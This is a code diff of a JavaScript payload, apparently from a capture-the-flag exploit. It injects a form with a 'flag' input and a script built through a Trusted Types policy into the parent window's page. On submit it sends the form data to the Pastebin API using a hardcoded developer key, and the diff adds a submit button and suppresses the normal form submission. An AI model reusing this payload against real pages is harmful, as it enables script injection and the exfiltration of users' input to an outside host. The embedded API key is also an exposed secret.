@@ -8,6 +8,7 @@
 				window.onload = function() {
 					var form = document.createElement("form");
 					var input = document.createElement("input");
+					var submit = document.createElement("input");
 					var script = document.createElement("script");
 					
 					var tt = trustedTypes.createPolicy('tt', { 
@@ -17,15 +18,18 @@
 					input.setAttribute("id", "flag");
 					input.setAttribute("type", "text");
 					
+					submit.setAttribute("type", "submit");
+					
 					script.setAttribute("id", "pwn");
 					script.setAttribute("src", tt.createScriptURL("true"));
 					
 					form.appendChild(input);
+					form.appendChild(submit);
 					
 					window.parent.document.body.appendChild(form);
 					window.parent.document.body.appendChild(script);
 					
-					form.onsubmit = function() {
+					form.onsubmit = function(e) {
 						var data = new FormData();
 						
 						data.append("api_dev_key", "7xJ2kw2sGE9foyL5tXhwntZ8wzJj-EPe");
@@ -40,6 +44,8 @@
 
 						xhr.open("POST", "https://pastebin.com/api/api_post.php");
 						xhr.send(data);
+						
+						e.preventDefault();
 					}
 				}
 			`;
